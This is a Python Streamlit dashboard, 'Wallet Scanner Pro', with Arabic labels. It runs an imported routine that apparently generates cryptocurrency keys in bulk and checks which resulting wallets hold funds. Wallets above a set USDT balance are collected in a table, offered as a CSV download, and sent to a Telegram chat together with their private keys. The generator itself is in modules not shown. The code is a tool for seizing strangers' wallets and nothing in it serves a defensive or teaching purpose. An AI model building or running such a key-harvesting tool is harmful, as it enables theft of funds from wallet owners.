import os
import time
import logging
import asyncio
import streamlit as st
from datetime import datetime, timedelta
import pandas as pd

from utils.notifications import Notifier
from utils.checker import WalletChecker
from utils.pricing import PriceFetcher
from config import Config
from threading import Thread

st.set_page_config(page_title="Wallet Scanner Pro", layout="wide")

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

cfg = Config()
price_fetcher = PriceFetcher(cfg)
checker = WalletChecker(cfg, price_fetcher)
notifier = Notifier(cfg)

if "scanner_running" not in st.session_state:
    st.session_state.scanner_running = False
if "wallets_found" not in st.session_state:
    st.session_state.wallets_found = []
if "scan_start_time" not in st.session_state:
    st.session_state.scan_start_time = None
if "total_scanned" not in st.session_state:
    st.session_state.total_scanned = 0
if "notified" not in st.session_state:
    st.session_state.notified = False

with st.sidebar:
    st.header("⚙️ إعدادات الفحص")
    min_usdt = st.number_input("الحد الأدنى للرصيد (USDT)", value=100.0)
    max_rate = st.number_input("معدل الفحص", value=20000)
    telegram_alert = st.toggle("🔔 إشعار Telegram عند تجاوز مبلغ", value=False)
    alert_threshold = st.number_input("📢 أرسل إشعار عند رصيد >", value=1000.0)

    if st.button("▶️ بدء الفحص"):
        if not st.session_state.scanner_running:
            st.session_state.scanner_running = True
            st.session_state.scan_start_time = datetime.now()
            st.session_state.notified = False

            def run_scanner():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                results = loop.run_until_complete(
                    checker.gen_and_check(min_usdt=min_usdt, concurrency=max_rate)
                )
                st.session_state.total_scanned += max_rate
                for w in results:
                    st.session_state.wallets_found.append(w)
                    if telegram_alert and w["total_usdt"] >= alert_threshold and not st.session_state.notified:
                        message = (
                            f"🎯 محفظة قوية مكتشفة!\n"
                            f"📍 الشبكة: {w['chain']}\n"
                            f"💰 الرصيد: ${w['total_usdt']}\n"
                            f"🔐 المفتاح: {w.get('private_key', '')}"
                        )
                        try:
                            loop.run_until_complete(notifier.send_telegram(message))
                            st.session_state.notified = True
                        except Exception as e:
                            logging.warning(f"Telegram send failed: {e}")
                st.session_state.scanner_running = False

            Thread(target=run_scanner).start()

    if st.button("⏹️ إيقاف"):
        st.session_state.scanner_running = False

tab1, tab2, tab3 = st.tabs(["📊 المراقبة", "💰 النتائج", "📈 الإحصائيات"])

with tab1:
    st.header("📡 مراقبة حية")
    st.metric("الحالة", "🟢 تعمل" if st.session_state.scanner_running else "🔴 متوقفة")
    st.metric("المسح الكلي", f"{st.session_state.total_scanned:,}")
    st.metric("عدد النتائج", len(st.session_state.wallets_found))

    if st.session_state.scan_start_time:
        elapsed = datetime.now() - st.session_state.scan_start_time
        st.metric("⏱️ مدة التشغيل", str(elapsed).split(".")[0])
    st.info("يتم التحديث عند كل دفعة مسح جديدة")

with tab2:
    st.header("💰 المحافظ المكتشفة")
    if st.session_state.wallets_found:
        df = pd.DataFrame([{
            "العنوان": w["address"],
            "السلسلة": w["chain"],
            "الرصيد (USDT)": w["total_usdt"],
            "عدد الرموز": len(w["tokens"]),
            "النتيجة": w.get("score", ""),
        } for w in st.session_state.wallets_found])
        st.dataframe(df, use_container_width=True)
        st.download_button(
            "⬇️ تحميل النتائج CSV",
            data=df.to_csv(index=False),
            file_name="wallets.csv",
            mime="text/csv"
        )
    else:
        st.warning("لا توجد نتائج بعد.")

with tab3:
    st.header("📈 إحصائيات")
    if st.session_state.wallets_found:
        df = pd.DataFrame([{
            "Chain": w["chain"],
            "Balance": w["total_usdt"]
        } for w in st.session_state.wallets_found])
        st.bar_chart(df.groupby("Chain").sum())
    else:
        st.info("ابدأ الفحص لرؤية الإحصائيات")

if st.session_state.scanner_running:
    time.sleep(3)
    st.rerun()